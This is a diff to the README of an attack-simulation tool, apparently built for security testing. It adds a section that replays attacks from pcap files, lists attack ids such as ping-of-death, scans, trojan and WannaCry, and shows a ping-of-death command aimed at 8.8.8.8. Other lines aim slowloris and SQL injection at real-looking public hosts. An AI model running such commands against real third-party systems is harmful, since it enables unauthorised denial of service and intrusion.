@@ -31,7 +31,7 @@ cd mmt-attacker/
 python  src/mmt-attack.py <attack_id> <argument-01> <argument-02> <argument-03>
 ```
 
-## Examples
+## Execute a real attack
 
 ### SSH brute force attack
 ```sh
@@ -51,9 +51,28 @@ python3.10  src/mmt_attack.py sql-injection-attack https://www.montimage.com/con
 python3.10 src/mmt_attack.py slowloris 217.70.184.55 -p 80 -s 100
 ```
 
-### HTTP Version is not correct
+## Simulate an attack based on a pcap file
 ```sh
-python3.10  src/mmt_attack.py http-version-not-correct 192.168.64.5
+python3.10  src/mmt_attack.py [attack_id] [target_ip_or_hostname]
+```
+
+List available attack-ids:
+
+```
+51-ping-of-death
+20-icmp-redirect-flood
+23-ip-frag-opverlapping
+45-tcp-maimon-scan
+27-udp-scan
+28-xmas-scan
+33-trojan
+38-wanna-cry
+```
+
+For example, to execute the Ping of Dead attack:
+
+```
+python3.10 src/mmt_attack.py 51-ping-of-death 8.8.8.8
 ```
 
 ## Add a new attack
